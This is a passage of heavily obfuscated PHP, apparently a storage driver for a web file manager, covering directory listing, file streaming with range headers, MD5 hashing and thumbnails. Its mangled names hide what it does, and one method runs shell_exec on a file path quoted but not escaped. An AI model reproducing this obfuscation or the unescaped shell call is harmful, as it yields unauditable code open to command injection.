($¹ù×Êûü as $ñôëí¨Ò) { $¤õ¦î­Ö = $ñôëí¨Ò[$õÖ‰[33]] == $õÖ‰[78]; $ùş´àá¤ = array($õÖ‰[87] => $ñôëí¨Ò[$õÖ‰[87]], $õÖ‰[78] => $¤õ¦î­Ö); if (isset($ñôëí¨Ò[$õÖ‰[79]])) { $ùş´àá¤[$õÖ‰[79]] = $ñôëí¨Ò[$õÖ‰[79]]; } if (isset($ñôëí¨Ò[$õÖ‰[88]])) { $ùş´àá¤[$õÖ‰[88]] = $ñôëí¨Ò[$õÖ‰[88]]; } if (!$¤õ¦î­Ö) { $äÏ®İ­Ì[] = $ùş´àá¤; continue; } $äÏ®İ­Ì[] = $ùş´àá¤; $œœÖüª = $ñôëí¨Ò[$õÖ‰[87]]; $è°±¼é® = $this->pathDriver; if (substr($ñôëí¨Ò[$õÖ‰[87]], 0, strlen($è°±¼é®)) == $è°±¼é®) { $œœÖüª = substr($œœÖüª, strlen($è°±¼é®)); } $this->listAllMake($œœÖüª, $äÏ®İ­Ì); } } public function listAllSimple($İú½ÒÊû, $Ë»“Ğó¿ = false) { $İ²’‹€’ = $this->listAll($İú½ÒÊû); return $this->listAllSimpleMake($İ²’‹€’, $this->getPathOuter($İú½ÒÊû), $Ë»“Ğó¿); } public function listAllSimpleMake($Âİú•ÚÀ, $ŠÜØŠªé, $½ƒçÁéÆ) { $ÓÄã€Í¡ =& $_SERVER[¶Ô„œ…¯]; $Ò¹ç“‘å = array(); $ŠÜØŠªé = rtrim(get_path_father($ŠÜØŠªé), $ÓÄã€Í¡[8]) . $ÓÄã€Í¡[8]; foreach ($Âİú•ÚÀ as $ÈüÔ‹’‚) { $…Ãİµ¸å = array($ÓÄã€Í¡[87] => $ÈüÔ‹’‚[$ÓÄã€Í¡[87]], $ÓÄã€Í¡[89] => $ÈüÔ‹’‚[$ÓÄã€Í¡[87]], $ÓÄã€Í¡[78] => $ÈüÔ‹’‚[$ÓÄã€Í¡[78]]); if (isset($ÈüÔ‹’‚[$ÓÄã€Í¡[79]]) && !$ÈüÔ‹’‚[$ÓÄã€Í¡[78]]) { $…Ãİµ¸å[$ÓÄã€Í¡[79]] = $ÈüÔ‹’‚[$ÓÄã€Í¡[79]]; } if (isset($ÈüÔ‹’‚[$ÓÄã€Í¡[88]])) { $…Ãİµ¸å[$ÓÄã€Í¡[88]] = $ÈüÔ‹’‚[$ÓÄã€Í¡[88]]; } if (is_array($ÈüÔ‹’‚[$ÓÄã€Í¡[90]])) { $…Ãİµ¸å[$ÓÄã€Í¡[89]] = $ÈüÔ‹’‚[$ÓÄã€Í¡[90]][$ÓÄã€Í¡[87]]; $…Ãİµ¸å[$ÓÄã€Í¡[79]] = $ÈüÔ‹’‚[$ÓÄã€Í¡[90]][$ÓÄã€Í¡[79]]; $…Ãİµ¸å[$ÓÄã€Í¡[88]] = $ÈüÔ‹’‚[$ÓÄã€Í¡[90]][$ÓÄã€Í¡[88]]; } else { if (substr($ÈüÔ‹’‚[$ÓÄã€Í¡[87]], 0, strlen($ŠÜØŠªé)) == $ŠÜØŠªé) { $…Ãİµ¸å[$ÓÄã€Í¡[87]] = substr($ÈüÔ‹’‚[$ÓÄã€Í¡[87]], strlen($ŠÜØŠªé)); } } $ººÙñ˜ = $ÈüÔ‹’‚[$ÓÄã€Í¡[78]] ? $ÓÄã€Í¡[8] : $ÓÄã€Í¡[12]; $…Ãİµ¸å[$ÓÄã€Í¡[89]] = rtrim($…Ãİµ¸å[$ÓÄã€Í¡[89]], $ÓÄã€Í¡[8]) . $ººÙñ˜; $…Ãİµ¸å[$ÓÄã€Í¡[87]] = $ÓÄã€Í¡[8] . trim($…Ãİµ¸å[$ÓÄã€Í¡[87]], $ÓÄã€Í¡[8]) . $ººÙñ˜; if (!$½ƒçÁéÆ) { $î×êîó¤ = explode($ÓÄã€Í¡[8], trim($…Ãİµ¸å[$ÓÄã€Í¡[87]], $ÓÄã€Í¡[8])); $…Ãİµ¸å[$ÓÄã€Í¡[87]] = $ÓÄã€Í¡[8] . implode($ÓÄã€Í¡[8], array_slice($î×êîó¤, 1)) . $ººÙñ˜; } $Ò¹ç“‘å[] = $…Ãİµ¸å; } return array_sort_by($Ò¹ç“‘å, $ÓÄã€Í¡[87]); } public function upload($Ê¨ëÃÛ, $±Ü­‡”¨, $Î©û¸¡è = false, $ÙúĞåòæ = REPEAT_REPLACE) { } public function uploadFileByID($‹İ³ô€à, $º€¼åÌ§, $Â‰ÅÊ…‘) { } public function uploadFileByPath($Õ…Â¤Û‰, $”›‘ê«ø, $ñÉáĞÎ = array()) { } public function isUploadServer() { $½š£“×ñ =& $_SERVER[¶Ô„œ…¯]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $½š£“×ñ[91]) { return !0; } return $GLOBALS[$½š£“×ñ[6]][$½š£“×ñ[92]][$½š£“×ñ[93]]; } public function isFileOutServer() { $²‰Ğåğ¦ =& $_SERVER[¶Ô„œ…¯]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $²‰Ğåğ¦[91]) { return !0; } return $GLOBALS[$²‰Ğåğ¦[6]][$²‰Ğåğ¦[92]][$²‰Ğåğ¦[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Ü£ ¦™è) { $óÂ¸‹œß =& $_SERVER[¶Ô„œ…¯]; if (!$this->isCdnHost()) { return $Ü£ ¦™è; } return str_replace(trim(get_url_root($Ü£ ¦™è), $óÂ¸‹œß[8]), trim($this->cdnHost, $óÂ¸‹œß[8]), $Ü£ ¦™è); } public function uploadLink($ïŸçïË¶, $Ç˜Šö¿ = 0) { $Ù©¯½  =& $_SERVER[¶Ô„œ…¯]; if ($this->isUploadServer()) { return; } $İÒ®şñ = $this->getType(); if (!in_array($İÒ®şñ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $éŸ¡§¹É = 1024 * 1024 * 10; $œ²Ê’Æä = $Ç˜Šö¿ <= $éŸ¡§¹É ? $Ù©¯½ [95] : $Ù©¯½ [96]; $ÛÔ•§° = (!$Ç˜Šö¿ ? 1 : ceil($Ç˜Šö¿ / pow(1024, 3))) * 3600 * 4; $ëİÄö¼â = $this->{$œ²Ê’Æä}($ïŸçïË¶, $ÛÔ•§°); if ($ëİÄö¼â) { $ëİÄö¼â[$Ù©¯½ [97]] = $ïŸçïË¶; $ëİÄö¼â[$Ù©¯½ [98]] = $İÒ®şñ; } return $ëİÄö¼â; } public function uploadFormData($è©’¤À–, $¢œÓö›† = 3600) { } public function uploadMultiData($Õ ÊÒÛ¦, $¨üÌ€äè = 3600) { } public function multiUploadFormData($ÑÖö€¾Š, $ˆâÈÓè = 3600) { return $this->uploadMultiData($ÑÖö€¾Š, $ˆâÈÓè); } public function download($¤çÔêœ„, $Âğıêö£) { } public function ext($‘âŸØ¬Æ) { $ä¶Æ¬Ö« =& $_SERVER[¶Ô„œ…¯]; if (strpos($‘âŸØ¬Æ, $ä¶Æ¬Ö«[8]) === -1) { $‰ŒÎöÏ¦ = $‘âŸØ¬Æ; } else { $‰ŒÎöÏ¦ = $this->pathThis($‘âŸØ¬Æ); } $ ¶“¦ö = $ä¶Æ¬Ö«[12]; if (strstr($‰ŒÎöÏ¦, $ä¶Æ¬Ö«[10])) { $ ¶“¦ö = substr($‰ŒÎöÏ¦, strrpos($‰ŒÎöÏ¦, $ä¶Æ¬Ö«[10]) + 1); $ ¶“¦ö = strtolower($ ¶“¦ö); } if (strlen($ ¶“¦ö) > 3 && preg_match($ä¶Æ¬Ö«[99], $ ¶“¦ö, $ÃôÖÏó)) { $ ¶“¦ö = $ä¶Æ¬Ö«[12]; } return $ ¶“¦ö; } public function pathThis($Ç¸•íÒ²) { $„¦İÖá– =& $_SERVER[¶Ô„œ…¯]; $Ç¸•íÒ² = str_replace($„¦İÖá–[100], $„¦İÖá–[8], rtrim($Ç¸•íÒ², $„¦İÖá–[8])); $µé†€‚ = strrpos($Ç¸•íÒ², $„¦İÖá–[8]); if ($µé†€‚ === !1) { return $Ç¸•íÒ²; } return substr($Ç¸•íÒ², $µé†€‚ + 1); } public function pathFather($Æò›Ãº¼) { $µáíªŞ =& $_SERVER[¶Ô„œ…¯]; $Æò›Ãº¼ = str_replace($µáíªŞ[100], $µáíªŞ[8], rtrim($Æò›Ãº¼, $µáíªŞ[8])); $ÓØú¢± = strrpos($Æò›Ãº¼, $µáíªŞ[8]); if ($ÓØú¢± === !1) { return $µáíªŞ[12]; } return substr($Æò›Ãº¼, 0, $ÓØú¢± + 1); } public function hashSimple($Ö¸îÖ’µ) { $ıÆ­ŒÒ =& $_SERVER[¶Ô„œ…¯]; if (!$Ö¸îÖ’µ) { return md5($ıÆ­ŒÒ[12]); } $Å»ã²´ = $this->size($Ö¸îÖ’µ); $Ò¢ŞÚïÀ = 200; $ê§îÍÖ‹ = 50; if ($Å»ã²´ <= $Ò¢ŞÚïÀ * $ê§îÍÖ‹) { return $this->hashMd5($Ö¸îÖ’µ) . $Å»ã²´; } $‘Ò–©ŞÒ = intval($Å»ã²´ / $ê§îÍÖ‹); $ü•ËõáŞ = $ıÆ­ŒÒ[12]; for ($Õ­±‚âÂ = 0; $Õ­±‚âÂ < $ê§îÍÖ‹; $Õ­±‚âÂ++) { $ü•ËõáŞ .= $this->fileSubstr($Ö¸îÖ’µ, $‘Ò–©ŞÒ * $Õ­±‚âÂ, $Ò¢ŞÚïÀ); } $ü•ËõáŞ .= $this->fileSubstr($Ö¸îÖ’µ, $Å»ã²´ - $Ò¢ŞÚïÀ, $Ò¢ŞÚïÀ); return md5($ü•ËõáŞ) . $Å»ã²´; } public static $md5Cache = array(); public function hashMd5($ğûå½Í¢) { if (!$ğûå½Í¢) { return md5($_SERVER[¶Ô„œ…¯][12]); } $ğûå½Í¢ = $this->iconvSystem($ğûå½Í¢); if (isset(self::$md5Cache[$ğûå½Í¢])) { return self::$md5Cache[$ğûå½Í¢]; } self::$md5Cache[$ğûå½Í¢] = $this->hashMd5Shell($ğûå½Í¢); if (!self::$md5Cache[$ğûå½Í¢]) { self::$md5Cache[$ğûå½Í¢] = @md5_file($ğûå½Í¢); } return self::$md5Cache[$ğûå½Í¢]; } private function hashMd5Shell($äõ”ˆ˜) { $Ş•Ñ” =& $_SERVER[¶Ô„œ…¯]; if (!$äõ”ˆ˜) { return md5($Ş•Ñ”[12]); } if (!function_exists($Ş•Ñ”[101])) { return !1; } $ˆú‚­‡ = array($Ş•Ñ”[102], $Ş•Ñ”[103]); $Ììµ‹º‡ = Cache::get($Ş•Ñ”[104]); if (!$Ììµ‹º‡) { $±¶é… = BASIC_PATH . $Ş•Ñ”[105]; $ñÀ‹•ëü = md5_file($±¶é…); $Ììµ‹º‡ = $Ş•Ñ”[106]; foreach ($ˆú‚­‡ as $–ŠƒÚö¢) { $œŸ°ğùÑ = shell_exec($–ŠƒÚö¢ . "\40\x22{$±¶é…}\x22"); if ($œŸ°ğùÑ && substr(trim($œŸ°ğùÑ), 0, 32) == $ñÀ‹•ëü) { $Ììµ‹º‡ = $–ŠƒÚö¢; break; } } Cache::set($Ş•Ñ”[104], $Ììµ‹º‡, 3600); } if ($Ììµ‹º‡ == $Ş•Ñ”[106]) { return !1; } $œŸ°ğùÑ = shell_exec($Ììµ‹º‡ . "\40\x22{$äõ”ˆ˜}\x22"); $œŸ°ğùÑ = str_replace($Ş•Ñ”[107], $Ş•Ñ”[12], $œŸ°ğùÑ); return substr($œŸ°ğùÑ, 0, 32); } public function link($ğŒ¢”Á‰) { return $ğŒ¢”Á‰; } public function fileOut($òçÀì‡Ä, $äÂŠ× = false, $¢¥Œ·Â£ = false, $—´ÕÌÒ÷ = '') { $³‰úãá« =& $_SERVER[¶Ô„œ…¯]; $this->cacheMethod(null, null); if (!$òçÀì‡Ä || !$this->exist($òçÀì‡Ä)) { show_json(LNG($³‰úãá«[108]), !1, $¢¥Œ·Â£); } $§àÉ™Ÿ× = $this->getType() == $³‰úãá«[109]; $Ä–À¢‰‹ = $GLOBALS[$³‰úãá«[6]][$³‰úãá«[92]][$³‰úãá«[110]][$³‰úãá«[111]]; $î·Œ¿‘Ö = (double) $GLOBALS[$³‰úãá«[6]][$³‰úãá«[92]][$³‰úãá«[110]][$³‰úãá«[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Öç¿„É¿ = $this->infoFull($òçÀì‡Ä); $øœÁş·¾ = $Öç¿„É¿[$³‰úãá«[79]]; $›¢÷µù½ = gmdate($³‰úãá«[113], $Öç¿„É¿[$³‰úãá«[88]]); $ÃÎíæŠï = $¢¥Œ·Â£ ? $¢¥Œ·Â£ : $this->iconvApp($Öç¿„É¿[$³‰úãá«[32]]); $–¶şò”› = 0; $šÆÔ¡ = $øœÁş·¾ - 1; $ôÂÊæ™¦ = $this->ext($ÃÎíæŠï); if (in_array($ôÂÊæ™¦, array($³‰úãá«[114], $³‰úãá«[115], $³‰úãá«[116], $³‰úãá«[117]))) { $ôÂÊæ™¦ = $³‰úãá«[118]; } if (in_array($ôÂÊæ™¦, array($³‰úãá«[119]))) { $ôÂÊæ™¦ = $³‰úãá«[120]; } if (!$—´ÕÌÒ÷) { $—´ÕÌÒ÷ = md5($›¢÷µù½ . $øœÁş·¾); } $—´ÕÌÒ÷ = $³‰úãá«[121] . $—´ÕÌÒ÷ . $³‰úãá«[121]; $ë àéˆì = get_file_mime($ôÂÊæ™¦); $œª°¦Íá = !0; $œª°¦Íá = isset($_GET[$³‰úãá«[122]]) ? !1 : !0; if ($äÂŠ× === !1 && !mime_support($ë àéˆì)) { $ë àéˆì = $³‰úãá«[123]; } header($³‰úãá«[124]); header($³‰úãá«[125] . $ë àéˆì); $ıÇÖ’¢” = rawurlencode($ÃÎíæŠï); $ıÇÖ’¢” = $³‰úãá«[121] . $ıÇÖ’¢” . $³‰úãá«[126] . $ıÇÖ’¢”; if ($äÂŠ×) { header($³‰úãá«[127]); header($³‰úãá«[128] . $ıÇÖ’¢”); } else { if ($œª°¦Íá) { header($³‰úãá«[129] . $ıÇÖ’¢”); } } $½Ô‘û›Æ = 3600 * 24 * 30; header($³‰úãá«[130]); header($³‰úãá«[131]); header($³‰úãá«[132] . $½Ô‘û›Æ); header($³‰úãá«[133] . gmdate($³‰úãá«[113], time() + $½Ô‘û›Æ) . $³‰úãá«[134]); if (isset($_SERVER[$³‰úãá«[135]]) && strtotime($_SERVER[$³‰úãá«[135]]) == $Öç¿„É¿[$³‰úãá«[88]]) { header($³‰úãá«[136], !0, 304); die; } if (isset($_SERVER[$³‰úãá«[137]]) && $_SERVER[$³‰úãá«[137]] == $—´ÕÌÒ÷) { header($³‰úãá«[138] . $—´ÕÌÒ÷, !0, 304); die; } header($³‰úãá«[138] . $—´ÕÌÒ÷); header($³‰úãá«[139] . $›¢÷µù½ . $³‰úãá«[134]); header($³‰úãá«[140] . $ÃÎíæŠï); header($³‰úãá«[141]); header($³‰úãá«[142] . $øœÁş·¾); header($³‰úãá«[143]); Hook::trigger($³‰úãá«[144], $òçÀì‡Ä, $øœÁş·¾, $ÃÎíæŠï, $ôÂÊæ™¦); if (!$äÂŠ× && $ôÂÊæ™¦ == $³‰úãá«[145]) { if ($øœÁş·¾ > 1024 * 1024 * 5) { die; } $®’µ©Êê = $this->getContent($òçÀì‡Ä); $®’µ©Êê = Html::clearSVG($®’µ©Êê); header($³‰úãá«[146] . strlen($®’µ©Êê)); echo $®’µ©Êê; die; } $›Û¼†÷ = strtolower($_SERVER[$³‰úãá«[147]]); if ($§àÉ™Ÿ× && $›Û¼†÷ && $Ä–À¢‰‹) { if (strstr($›Û¼†÷, $³‰úãá«[148])) { header($³‰úãá«[149] . $òçÀì‡Ä); } else { if (strstr($›Û¼†÷, $³‰úãá«[150])) { header($³‰úãá«[151] . $òçÀì‡Ä); } else { if (strstr($›Û¼†÷, $³‰úãá«[152])) { header($³‰úãá«[153] . $òçÀì‡Ä); } } } if ($î·Œ¿‘Ö) { header($³‰úãá«[154] . $î·Œ¿‘Ö); } return; } if (isset($_SERVER[$³‰úãá«[155]])) { if (preg_match($³‰úãá«[156], $_SERVER[$³‰úãá«[155]], $¸Áöâï’)) { $–¶şò”› = intval($¸Áöâï’[1]); $–¶şò”› = $–¶şò”› <= 0 ? 0 : ($–¶şò”› >= $šÆÔ¡ ? $šÆÔ¡ : $–¶şò”›); if (!empty($¸Áöâï’[2])) { $®²‡‰Á  = intval($¸Áöâï’[2]); $šÆÔ¡ = $®²‡‰Á  < $–¶şò”› ? $–¶şò”› : ($®²‡‰Á  >= $šÆÔ¡ ? $šÆÔ¡ : $®²‡‰Á ); } } header($³‰úãá«[157]); header("\x43\x6f\156\164\x65\156\164\x2d\x52\x61\156\147\145\72\40\142\171\164\x65\163\x20{$–¶şò”›}\x2d{$šÆÔ¡}\x2f" . $øœÁş·¾); } else { header($³‰úãá«[158]); } header($³‰úãá«[159]); header($³‰úãá«[160]); $£ÖÂÙ€ = !0; if ($_SERVER[$³‰úãá«[161]] == $³‰úãá«[162] && $øœÁş·¾ > 1204 * 1024 * 1024 * 2) { $£ÖÂÙ€ = !1; } if ($£ÖÂÙ€) { header($³‰úãá«[163] . ($šÆÔ¡ - $–¶şò”› + 1)); } if ($_SERVER[$³‰úãá«[164]] == $³‰úãá«[165]) { return; } $‡ÒüÚ‘ = array($³‰úãá«[166] => !1, $³‰úãá«[167] => $–¶şò”›, $³‰úãá«[168] => $šÆÔ¡, $³‰úãá«[169] => $ôÂÊæ™¦, $³‰úãá«[170] => $Öç¿„É¿, $³‰úãá«[171] => $³‰úãá«[12], $³‰úãá«[172] => 0); $‡ÒüÚ‘ = Hook::filter($³‰úãá«[173], $‡ÒüÚ‘); $ÃÀ€•­ = 1024 * 300; $ûû‹Ãú® = 0; if ($î·Œ¿‘Ö) { $ûû‹Ãú® = intval(1000 * 1000 * ($ÃÀ€•­ / $î·Œ¿‘Ö)); } while ($–¶şò”› <= $šÆÔ¡) { $ÇÁü·—ì = timeFloat(); check_abort(); $Àã¯ô‹ê = $šÆÔ¡ - $–¶şò”› + 1; if ($Àã¯ô‹ê <= $ÃÀ€•­) { $ÃÀ€•­ = $Àã¯ô‹ê; } $®’µ©Êê = $this->fileSubstr($òçÀì‡Ä, $–¶şò”›, $ÃÀ€•­); if ($‡ÒüÚ‘[$³‰úãá«[166]]) { $‡ÒüÚ‘[$³‰úãá«[171]] = $®’µ©Êê; $‡ÒüÚ‘[$³‰úãá«[172]] = $–¶şò”›; $‡ÒüÚ‘ = Hook::filter($³‰úãá«[174], $‡ÒüÚ‘); $®’µ©Êê = $‡ÒüÚ‘[$³‰úãá«[171]]; } echo $®’µ©Êê; $–¶şò”› += $ÃÀ€•­; if ($ÃÀ€•­ == $Àã¯ô‹ê) { $–¶şò”› = $šÆÔ¡ + 1; } if ($ûû‹Ãú®) { $•Ößõè = intval(1000 * 1000 * (timeFloat() - $ÇÁü·—ì)); $ªÚ•ƒÎá = $ûû‹Ãú® - $•Ößõè; if ($ªÚ•ƒÎá > 5) { usleep($ªÚ•ƒÎá); } } } } public function fileOutServer($Æù­óûÑ, $º‡¤Õï• = false, $óÜ±Õı€ = false, $ÃÏâ‹¸ö = '') { $this->fileOut($Æù­óûÑ, $º‡¤Õï•, $óÜ±Õı€, $ÃÏâ‹¸ö); } public function fileOutLink($¤Ç¹„) { header($_SERVER[¶Ô„œ…¯][175] . $¤Ç¹„); die; } public function cacheMethod($É‚ı²­‡, $—’‘òÎ, $ïš½–ğ = null) { $ìæ¡½™š =& $_SERVER[¶Ô„œ…¯]; static $€Äò–ÇÀ = array(); $ƒşàëóÂ = $—’‘òÎ ? ltrim($this->getPathOuter($—’‘òÎ), $ìæ¡½™š[8]) : $ìæ¡½™š[12]; $‚±«ú¾” = $ìæ¡½™š[176] . $É‚ı²­‡ . $ìæ¡½™š[177] . rtrim($ƒşàëóÂ, $ìæ¡½™š[8]); if (is_null($É‚ı²­‡)) { $€Äò–ÇÀ = array(); return; } if (is_null($—’‘òÎ)) { foreach ($€Äò–ÇÀ as $‚±«ú¾” => $ÅÙ¯µö) { if (!strstr($‚±«ú¾”, $ìæ¡½™š[176] . $É‚ı²­‡ . $ìæ¡½™š[178])) { continue; } unset($€Äò–ÇÀ[$‚±«ú¾”]); } return; } if (!is_null($ïš½–ğ)) { $€Äò–ÇÀ[$‚±«ú¾”] = $ïš½–ğ; return; } $ìâ¾È‹Ê = isset($€Äò–ÇÀ[$‚±«ú¾”]) ? $€Äò–ÇÀ[$‚±«ú¾”] : null; if (!is_null($ìâ¾È‹Ê)) { return $ìâ¾È‹Ê; } $ìâ¾È‹Ê = $this->{$É‚ı²­‡}($—’‘òÎ); $€Äò–ÇÀ[$‚±«ú¾”] = $ìâ¾È‹Ê; return $ìâ¾È‹Ê; } public function cacheMethodInfoSet($Öí”ÑÉÌ, $Ûƒ®ŒÙ„, $£àÙ–Æ“ = false) { $ÚËÔœĞÊ =& $_SERVER[¶Ô„œ…¯]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÚËÔœĞÊ[179], $Öí”ÑÉÌ, $Ûƒ®ŒÙ„); $this->cacheMethod($ÚËÔœĞÊ[180], $Öí”ÑÉÌ, $Ûƒ®ŒÙ„ ? !1 : !0); if (is_array($£àÙ–Æ“)) { $this->cacheMethod($ÚËÔœĞÊ[181], $Öí”ÑÉÌ, $£àÙ–Æ“); } } public function fileOutImage($¤ƒüìÉ, $äÕ”Ô = 250) { $ÈèŸé‚‘ =& $_SERVER[¶Ô„œ…¯]; set_timeout(); if (substr($¤ƒüìÉ, 0, 4) == $ÈèŸé‚‘[152]) { $this->fileOutLink($¤ƒüìÉ); } $¹¡‚Ğ = $this->info($¤ƒüìÉ); $²ìÏéçŒ = !1; $ü÷¼Šæ = isset($GLOBALS[$ÈèŸé‚‘[182]]) ? $GLOBALS[$ÈèŸé‚‘[182]] : array(); if ($ü÷¼Šæ && $ü÷¼Šæ[$ÈèŸé‚‘[183]] == $¹¡‚Ğ[$ÈèŸé‚‘[87]]) { $¹¡‚Ğ = $ü÷¼Šæ; $ìáÉê‡º = $¹¡‚Ğ[$ÈèŸé‚‘[184]]; if ($ìáÉê‡º && isset($ìáÉê‡º[$ÈèŸé‚‘[185]])) { if ($ìáÉê‡º[$ÈèŸé‚‘[185]] <= $äÕ”Ô && $ìáÉê‡º[$ÈèŸé‚‘[186]] <= $äÕ”Ô) { $²ìÏéçŒ = !0; } } } if ($¹¡‚Ğ[$ÈèŸé‚‘[79]] <= 1024 * 50 || $²ìÏéçŒ || !function_exists($ÈèŸé‚‘[187]) || $¹¡‚Ğ[$ÈèŸé‚‘[169]] == $ÈèŸé‚‘[188]) { return $this->fileOut($¤ƒüìÉ, !1, $¹¡‚Ğ[$ÈèŸé‚‘[32]]); } $Ø¸™úö’ = kodIO::hashPath($¹¡‚Ğ); $³†À´µ = "\x63\157\166\x65\162\x5f{$Ø¸™úö’}\x5f{$äÕ”Ô}\56\x70\x6e\147"; $Èæ—À§± = IO_PATH_SYSTEM_TEMP . $ÈèŸé‚‘[189]; $´æ®åñÓ = IO::infoFullSimple($Èæ—À§±); $ı¢Ã×È÷ = $´æ®åñÓ && is_array($´æ®åñÓ) ? $´æ®åñÓ[$ÈèŸé‚‘[87]] : $ÈèŸé‚‘[12]; if (!$ı¢Ã×È÷) { $ı¢Ã×È÷ = IO::mkdir($Èæ—À§±); } if ($¹¡‚Ğ[$ÈèŸé‚‘[190]] == $ÈèŸé‚‘[191] && isset($¹¡‚Ğ[$ÈèŸé‚‘[192]]) && $¹¡‚Ğ[$ÈèŸé‚‘[192]] == kodIO::sourceID($ı¢Ã×È÷)) { $°¡‡…ï“ = $¹¡‚Ğ[$ÈèŸé‚‘[193]]; if ($äÕ”Ô <= 500) { $Œã¼ŸĞ‡ = preg_replace($ÈèŸé‚‘[194], $ÈèŸé‚‘[195], $¹¡‚Ğ[$ÈèŸé‚‘[32]]); $°¡‡…ï“ = IO::fileNameExist($ı¢Ã×È÷, $Œã¼ŸĞ‡); } return IO::fileOut(KodIO::make($°¡‡…ï“), !1, $¹¡‚Ğ[$ÈèŸé‚‘[32]]); } $ÇÊı¡»± = IO::fileNameExist($ı¢Ã×È÷, $³†À´µ); if ($ÇÊı¡»±) { return IO::fileOut(KodIO::make($ÇÊı¡»±), !1, $¹¡‚Ğ[$ÈèŸé‚‘[32]]); } if ($äÕ”Ô > 1000) { $this->makeImageCover($ı¢Ã×È÷, $¤ƒüìÉ, $³†À´µ, $äÕ”Ô); $this->makeImageCover($ı¢Ã×È÷, $¤ƒüìÉ, "\143\157\166\145\162\137{$Ø¸™úö’}\x5f\x32\x35\x30\56\160\156\147", 250); $ÇÊı¡»± = IO::fileNameExist($ı¢Ã×È÷, $³†À´µ); if ($ÇÊı¡»±) { return IO::fileOut(KodIO::make($ÇÊı¡»±), !1, $¹¡‚Ğ[$ÈèŸé‚‘[32]]); } die; } if (!kodIO::allowCover($¹¡‚Ğ)) { return $this->fileOut($¤ƒüìÉ, !1, $¹¡‚Ğ[$ÈèŸé‚‘[32]]); } $ÚŠœÁûà = Cache::get($³†À´µ); if ($ÚŠœÁûà == $ÈèŸé‚‘[196] || $ÚŠœÁûà == $ÈèŸé‚‘[197]) { echo $ÚŠœÁûà; die; } Cache::set($³†À´µ, $ÈèŸé‚‘[197], 60); $ƒô·àËµ = array($ı¢Ã×È÷, $¹¡‚Ğ[$ÈèŸé‚‘[87]], $³†À´µ, $äÕ”Ô); $Ì„¡ÃÁ­ = $ÈèŸé‚‘[198] . $¹¡‚Ğ[$ÈèŸé‚‘[79]] . $ÈèŸé‚‘[199] . $³†À´µ . $ÈèŸé‚‘[200] . $¹¡‚Ğ[$ÈèŸé‚‘[32]] . $ÈèŸé‚‘[201] . $¹¡‚Ğ[$ÈèŸé‚‘[87]]; TaskQueue::add($ÈèŸé‚‘[202], $ƒô·àËµ, $Ì„¡ÃÁ­, $³†À´µ); } public function makeImageCover($–‹›ŒÛ, $ÅëÇÊ¬•, $”å¬·–, $ÚÚôğĞ·) { $šÑé…€Ì =& $_SERVER[¶Ô„œ…¯]; if (IO::fileNameExist($–‹›ŒÛ, $”å¬·–)) { return $šÑé…€Ì[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ß‘×±§‘ = DATA_THUMB . $”å¬·–; del_file($ß‘×±§‘); $ƒˆàßÃ = IO::copy($ÅëÇÊ¬•, TEMP_FILES, !1, $”å¬·–); if (!@file_exists($ƒˆàßÃ)) { return $šÑé…€Ì[204]; } ImageThumb::createThumb($ƒˆàßÃ, $ß‘×±§‘, $ÚÚôğĞ·, $ÚÚôğĞ· * 10); if (@file_exists($ß‘×±§‘)) { Cache::remove($”å¬·–); return IO::move($ß‘×±§‘, $–‹›ŒÛ); } Cache::set($”å¬·–, $šÑé…€Ì[196], 600); del_file($ß‘×±§‘); return $šÑé…€Ì[205] . $ƒˆàßÃ . $šÑé…€Ì[74]; } public function fileOutImageServer($¸ù™ãõã, $ºä¤“¾Õ = 250) { $this->fileOutImage($¸ù™ãõã, $ºä¤“¾Õ); } public function fileNameAuto($ùó©úä¯, $ãÙÈÁ›Â, $©øµÁşú = REPEAT_RENAME, $ŠÉ¾Ôö• = false) { $›«ÎœÊº =& $_SERVER[¶Ô„œ…¯]; $Õßı°È± = $ùó©úä¯ === $›«ÎœÊº[12] ? $ãÙÈÁ›Â : rtrim($ùó©úä¯, $›«ÎœÊº[8]) . $›«ÎœÊº[8] . $ãÙÈÁ›Â; if ($©øµÁşú == REPEAT_REPLACE || !$this->exist($Õßı°È±) || $ŠÉ¾Ôö• && $©øµÁşú != REPEAT_RENAME_FOLDER) { return $ãÙÈÁ›Â; } if ($©øµÁşú == REPEAT_SKIP) { return !1; } $ï€¿Š = $›«ÎœÊº[10] . get_path_ext($ãÙÈÁ›Â); $ï€¿Š = $ï€¿Š == $›«ÎœÊº[10] || $ŠÉ¾Ôö• ? $›«ÎœÊº[12] : $ï€¿Š; $ğÅ÷öÄÇ = 1; $É™Òõ­­ = substr($ãÙÈÁ›Â, 0, strlen($ãÙÈÁ›Â) - strlen($ï€¿Š)); $é¾ïâÏ® = $É™Òõ­­ . "\x28{$ğÅ÷öÄÇ}\51{$ï€¿Š}"; while ($this->exist(rtrim($ùó©úä¯, $›«ÎœÊº[8]) . $›«ÎœÊº[8] . $é¾ïâÏ®)) { $é¾ïâÏ® = $É™Òõ­­ . "\x28{$ğÅ÷öÄÇ}\51{$ï€¿Š}"; $ğÅ÷öÄÇ++; } return $é¾ïâÏ®; } private function fileNameAutoList($²²íÜ¥Ö, $¿¤ûöõÛ, $­‰ÙöıŸ = false) { $“´Ê¡‘Ÿ =& $_SERVER[¶Ô„œ…¯]; $çÚéúñ¶ = $this->listPath($²²íÜ¥Ö, !0); $çÚéúñ¶ = array_merge($çÚéúñ¶[$“´Ê¡‘Ÿ[85]], $çÚéúñ¶[$“´Ê¡‘Ÿ[86]]); $‹ûß‹é÷ = array_to_keyvalue($çÚéúñ¶, $“´Ê¡‘Ÿ[12], $“´Ê¡‘Ÿ[32]); $ş¿€ÎÏ = $“´Ê¡‘Ÿ[10] . get_path_ext($¿¤ûöõÛ); $ş¿€ÎÏ = $ş¿€ÎÏ == $“´Ê¡‘Ÿ[10] || $­‰ÙöıŸ ? $“´Ê¡‘Ÿ[12] : $ş¿€ÎÏ; $™”ÇÚìì = substr($¿¤ûöõÛ, 0, strlen($¿¤ûöõÛ) - strlen($ş¿€ÎÏ)); $İîÊÚ½Æ = $™”ÇÚìì . 